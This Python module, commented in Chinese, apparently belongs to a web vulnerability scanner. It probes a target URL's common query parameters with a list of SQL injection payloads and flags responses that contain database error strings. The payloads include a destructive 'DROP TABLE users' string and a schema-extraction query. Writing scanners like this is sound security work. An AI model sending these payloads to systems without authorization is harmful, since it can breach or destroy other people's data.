"""
SQL注入检测模块
"""
import httpx
from typing import List
from loguru import logger

from app.models.scan_target import ScanConfig
from app.models.vulnerability import Vulnerability, VulnerabilitySeverity


# 常见的SQL注入payload
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL --",
    "1; DROP TABLE users --",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
]


async def detect(url: str, config: ScanConfig) -> List[Vulnerability]:
    """检测SQL注入漏洞"""
    vulnerabilities = []
    
    try:
        async with httpx.AsyncClient(timeout=config.timeout) as client:
            # 测试常见参数名
            param_names = ['id', 'user', 'username', 'search', 'query', 'q']
            
            for param in param_names:
                test_url = f"{url}?{param}="
                
                for payload in SQLI_PAYLOADS:
                    try:
                        full_url = test_url + payload
                        response = await client.get(full_url)
                        
                        # 简单的错误检测（实际应该更复杂）
                        error_patterns = [
                            'SQL syntax',
                            'mysql_fetch',
                            'You have an error in your SQL',
                            'Unclosed quotation mark',
                            'ORA-01756',
                        ]
                        
                        for pattern in error_patterns:
                            if pattern.lower() in response.text.lower():
                                vuln = Vulnerability(
                                    name="SQL注入",
                                    severity=VulnerabilitySeverity.HIGH,
                                    description=f"在参数 {param} 中检测到SQL注入漏洞",
                                    location=full_url,
                                    poc=f"Payload: {payload}",
                                    remediation="使用参数化查询或预编译语句",
                                    target_url=url,
                                    scan_id=""
                                )
                                vulnerabilities.append(vuln)
                                logger.warning(f"发现SQL注入漏洞: {full_url}")
                                break
                    
                    except Exception as e:
                        logger.debug(f"测试失败: {str(e)}")
                        continue
    
    except Exception as e:
        logger.error(f"SQL注入检测失败: {str(e)}")
    
    return vulnerabilities
